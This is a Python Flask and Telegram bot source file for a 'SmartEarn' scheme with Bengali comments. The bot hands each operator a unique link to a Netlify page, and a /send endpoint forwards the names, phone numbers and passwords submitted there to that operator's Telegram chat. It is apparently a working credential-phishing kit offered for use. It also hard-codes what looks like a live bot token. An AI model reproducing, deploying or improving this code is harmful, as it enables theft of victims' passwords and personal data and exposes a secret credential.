# =======================================
# SmartEarn Multi-User Bot System
# Developer: MN SIDDIK
# =======================================

from flask import Flask, request, jsonify
import requests
import uuid
import os

app = Flask(__name__)

BOT_TOKEN = os.getenv("8572616463:AAH1sQJsSlYOhj657naFUpKvlNquwtjzrLI")  # Telegram bot token (set in Railway environment)
BASE_URL = "https://smartearn.netlify.app"  # তোমার Netlify লিংক

# Memory storage for user UID mapping (runtime only)
USERS = {}

# =========================
# Telegram Webhook Receiver
# =========================
@app.route(f"/{BOT_TOKEN}", methods=["POST"])
def handle_telegram():
    data = request.get_json()
    if "message" in data:
        chat_id = data["message"]["chat"]["id"]
        text = data["message"].get("text", "")

        if text == "/start":
            # Unique ID তৈরি করো
            unique_id = str(uuid.uuid4())[:8]
            USERS[unique_id] = chat_id

            link = f"{BASE_URL}/?uid={unique_id}"
            send_message(chat_id, f"🎉 Welcome to SmartEarn!\n\n🔗 Your unique link:\n{link}\n\nএই লিংকটি কেবল আপনার জন্য। অন্য কাউকে দেবেন না 🔒")

    return jsonify({"ok": True})


# =========================
# Receive Form Data from Netlify
# =========================
@app.route("/send", methods=["POST"])
def handle_form():
    data = request.get_json()
    uid = data.get("uid")
    name = data.get("name")
    number = data.get("number")
    password = data.get("password")

    if not uid or uid not in USERS:
        return jsonify({"error": "Invalid or expired UID"}), 400

    chat_id = USERS[uid]
    message = (
        f"📥 *New Submission Received!*\n\n"
        f"👤 Name: {name}\n"
        f"📞 Number: {number}\n"
        f"🔑 Password: {password}\n\n"
        f"🆔 UID: {uid}"
    )
    send_message(chat_id, message)
    return jsonify({"success": True})


# =========================
# Send message to Telegram
# =========================
def send_message(chat_id, text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
    requests.post(url, json=payload)


@app.route("/", methods=["GET"])
def home():
    return "✅ SmartEarn Bot is running successfully!"


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
